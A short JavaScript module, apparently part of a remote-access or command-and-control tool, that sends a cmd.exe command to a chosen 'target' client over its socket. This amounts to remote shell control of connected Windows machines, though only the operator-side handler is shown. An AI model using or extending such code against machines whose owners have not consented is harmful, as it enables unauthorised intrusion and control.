// *** Executes a cmd.exe command on the target connected client *** //


module.exports = function(args, rl) {

	const index = connectTo.slotNumber - 1;
	const socket = sockets[index];

	const cmdLine = args.join(" ");
	socket.write('exec ' + cmdLine);

	rl.setPrompt('')

}